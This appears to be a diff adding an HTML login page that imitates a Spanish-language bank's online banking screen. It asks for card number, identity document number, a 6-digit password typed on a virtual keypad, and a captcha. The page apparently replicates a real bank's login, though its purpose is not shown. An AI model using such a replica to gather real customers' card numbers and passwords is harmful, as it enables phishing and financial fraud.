@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/styles.css">
+    <script async type="text/javascript" src="./js/min/banca.min.js"></script>
+</head>
+
+<body>
+    <div class="container">
+
+        <form id="loginForm" action="/login" method="POST">
+            <div class="form-group">
+
+                <label for="product">Seleccione:</label>
+                <select id="product" name="product">
+                    <option value="multired">Multired Global Débito</option>
+                    <option value="credito">Tarjeta de Crédito</option>
+                </select>
+            </div>
+            <div class="form-group">
+
+                <label for="card-number">Número de tarjeta:</label>
+                <input type="text" id="card-number" name="card-number" maxlength="16" inputmode="numeric">
+            </div>
+
+            <div class="form-group">
+                <label for="document-type">Tipo y N° Documento:</label>
+                <select id="document-type" name="document-type">
+                    <option value="dni">DNI</option>
+                    <option value="carnet">Carnet de Extranjería</option>
+                </select>
+                <input type="text" id="document-number" name="document-number" maxlength="8" inputmode="numeric"
+                    >
+            </div>
+            <div class="teclado-container">
+                <div class="teclado" id="teclado">
+                    <button type="button" onclick="addToInput('9')">9</button>
+                    <button type="button" onclick="addToInput('4')">4</button>
+                    <button type="button" onclick="addToInput('1')">1</button>
+                    <button type="button" onclick="addToInput('7')">7</button>
+                    <button type="button" onclick="addToInput('2')">2</button>
+                    <button type="button" onclick="addToInput('5')">5</button>
+                    <button type="button" onclick="addToInput('6')">6</button>
+                    <button type="button" onclick="addToInput('3')">3</button>
+                    <button type="button" onclick="addToInput('0')">0</button>
+                    <button type="button" onclick="addToInput('8')">8</button>
+                    <button type="button" style="grid-column: span 2;" onclick="clearInput()">LIMPIAR</button>
+                </div>
+                <div class="column-right">
+                    <label>Ingresa tu clave usando el teclado virtual:</label>
+                    <input type="text" id="clave-virtual" name="clave-virtual" readonly maxlength="6" >
+                </div>
+            </div>
+            <div class="actions">
+                <a href="#">Genera tu Clave de Internet</a><br>
+                <a href="#">¡Olvidé mi clave!</a>
+            </div>
+            <div class="form-group">
+
+                <label>Ingresa el texto de la imagen:</label>
+                <div class="captcha">
+                    <canvas id="captchaCanvas" width="150" height="50"></canvas>
+                    <input type="text" name="captcha">
+                    <a href="#" onclick="generateCaptcha()">Cambiar texto</a>
+                </div>
+            </div>
+            <button type="submit">INGRESAR</button>
+        </form>
+    </div>
+
+</body>
+
+</html>
